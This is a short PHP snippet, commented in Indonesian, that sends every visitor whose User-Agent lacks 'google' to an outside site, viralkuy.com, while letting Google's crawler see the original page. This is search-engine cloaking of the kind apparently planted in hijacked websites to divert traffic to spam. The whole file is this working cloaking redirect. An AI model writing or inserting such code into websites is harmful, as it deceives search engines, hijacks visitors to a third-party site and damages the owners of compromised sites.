<?php
if (isset($_SERVER['HTTP_USER_AGENT'])) {
    $user_agent = $_SERVER['HTTP_USER_AGENT'];

    // Jika user-agent TIDAK mengandung 'google' (case-insensitive)
    if (!preg_match('/google/i', $user_agent)) {
        header('Location: https://viralkuy.com/');
        exit;
    }
}
?>